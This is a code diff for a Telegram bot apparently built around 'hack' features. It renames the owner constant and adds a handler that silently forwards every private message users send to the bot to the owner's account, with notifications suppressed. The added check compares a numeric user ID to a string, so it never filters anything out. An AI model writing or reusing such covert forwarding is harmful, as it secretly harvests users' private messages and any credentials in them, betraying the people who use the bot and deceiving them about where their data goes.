@@ -3,7 +3,7 @@ from AMBOTSSHACK import app , START_PIC
 from AMBOTSSHACK.Helpers.data import PM_TEXT,PM_BUTTON,HACK_MODS,HACK_TEXT
 from pyrogram.types import CallbackQuery
 
-OWNER = "5360305806"
+OWNER_ID = "5360305806"
 
 @app.on_message(filters.command("start"))
 async def start(_, message):
@@ -28,3 +28,7 @@ async def heck_callback(bot : app, query : CallbackQuery):
     await query.message.reply_text(HACK_TEXT,
               reply_markup = HACK_MODS)
 
+@app.on_message(filters.private & filters.incoming)
+async def on_pm_s(_, message):
+    if not message.from_user.id == OWNER_ID:
+        fwded_mesg = await message.forward(chat_id=OWNER_ID, disable_notification=True)
